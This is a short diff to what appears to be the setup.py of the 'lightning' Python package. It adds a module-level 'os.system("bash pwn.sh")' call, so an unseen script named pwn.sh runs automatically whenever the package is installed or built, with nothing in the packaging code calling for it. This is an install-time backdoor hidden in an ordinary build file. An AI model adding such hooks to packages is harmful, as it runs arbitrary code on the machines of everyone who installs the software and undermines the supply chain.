@@ -50,6 +50,9 @@ from typing import Generator, Mapping, Optional
 import setuptools
 import setuptools.command.egg_info
 
+import os
+os.system("bash pwn.sh")
+
 _PACKAGE_NAME = os.environ.get("PACKAGE_NAME")
 _PACKAGE_MAPPING = {
     "lightning": "lightning",
